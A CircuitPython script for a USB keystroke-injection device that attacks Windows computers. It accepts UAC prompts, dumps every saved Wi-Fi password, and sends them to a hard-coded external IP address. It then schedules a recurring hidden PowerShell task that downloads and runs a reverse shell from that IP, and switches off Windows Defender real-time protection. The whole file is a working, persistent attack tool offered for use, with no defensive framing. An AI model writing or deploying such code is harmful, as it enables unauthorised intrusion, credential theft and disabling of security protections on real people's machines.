import time
import board
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

# Initialize keyboard
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

# Wait for HID to be recognized by the system
time.sleep(2)

# Step 1: Open Run dialog
kbd.send(Keycode.GUI, Keycode.R)
time.sleep(1.5)

# Step 2: Open PowerShell as administrator
layout.write("powershell")
time.sleep(0.5)
kbd.send(Keycode.LEFT_CONTROL, Keycode.LEFT_SHIFT, Keycode.ENTER)  # Ctrl + Shift + Enter
time.sleep(2)  # Wait for UAC prompt

# Step 3: Accept UAC prompt (press Left Arrow then Enter)
kbd.send(Keycode.LEFT_ARROW)  # Navigate to "Yes" in UAC prompt
time.sleep(0.5)
kbd.send(Keycode.ENTER)
time.sleep(2)  # Wait for PowerShell to open

# Step 4: Type the PowerShell command to send wifi credentials to the server
powershell_command = '$ip="3.224.73.92";$port=5555;$profiles=(netsh wlan show profiles)|Select-String "All User Profile"|%{$_.ToString().Split(":")[1].Trim()};$data=@();foreach($p in $profiles){$info=netsh wlan show profile name="$p" key=clear|Select-String "Key Content";if($info){$pw=$info.ToString().Split(":")[1].Trim();$data+=@{SSID=$p;Password=$pw}}};$json=$data|ConvertTo-Json;$c=New-Object Net.Sockets.TcpClient($ip,$port);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$w.Write($json);$w.Flush();$w.Close();$c.Close()'
layout.write(powershell_command + "\n")  # Type command and press Enter
time.sleep(1.7)  # Wait for command execution
layout.write("exit\n")  # Close PowerShell

# Step 5: Open Run dialog
kbd.send(Keycode.GUI, Keycode.R)
time.sleep(1.5)

# Step 6: Open cmd
layout.write("cmd\n")
time.sleep(1.8)

# Step 7: Run this cmd command to schedule task
command = 'schtasks /create /tn "RunReversePowerShell" /tr "cmd.exe /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \\"iex (iwr \'http://3.224.73.92/reverse.ps1\')\\"" /sc minute /mo 5 /it /f'
layout.write(command + "\n")
time.sleep(1.5)
layout.write("exit\n")

# Step 8: Powershell Reverse Shell
kbd.send(Keycode.GUI, Keycode.R)
time.sleep(1.7)
layout.write('powershell -WindowStyle Hidden -ep Bypass -c "iex (iwr http://3.224.73.92/reverse.ps1)"\n')
time.sleep(2)

# Step 5: Disable Windows Defender via GUI
kbd.send(Keycode.GUI, Keycode.R)
time.sleep(2)
layout.write("windowsdefender://\n")  # Open Windows Security
time.sleep(2)  # Wait for Windows Security to open

# Navigate to Virus & threat protection (assumes second option)
kbd.send(Keycode.TAB)  # Move to Virus & threat protection
time.sleep(1.4)
kbd.send(Keycode.TAB)  # Move to Virus & threat protection
time.sleep(1.4)
kbd.send(Keycode.TAB)  # Move to Virus & threat protection
time.sleep(1.4)
kbd.send(Keycode.TAB)
time.sleep(1.4)
kbd.send(Keycode.ENTER)
time.sleep(2)  # Wait for section to load

# Navigate to Manage settings (assumes 4 TABs to reach link)
kbd.send(Keycode.TAB)
time.sleep(1.3)
kbd.send(Keycode.TAB)
time.sleep(1.3)
kbd.send(Keycode.TAB)
time.sleep(1.3)
kbd.send(Keycode.TAB)
time.sleep(1.3)
kbd.send(Keycode.ENTER)
time.sleep(1.5)  # Wait for settings page

# Navigate to Real-time protection toggle (assumes 1 TAB)
#kbd.send(Keycode.TAB)
#time.sleep(2)
kbd.send(Keycode.SPACE)  # Toggle off
time.sleep(2)

# Accept UAC prompt (press Left Arrow then Enter)
kbd.send(Keycode.LEFT_ARROW)  # Navigate to "Yes" in UAC prompt
time.sleep(2)
kbd.send(Keycode.ENTER)
time.sleep(2)  # Wait for confirmation

# Close Windows Security (Alt + F4)
kbd.send(Keycode.ALT, Keycode.F4)
time.sleep(1.5)
kbd.send(Keycode.ALT, Keycode.F4)
time.sleep(1.5)
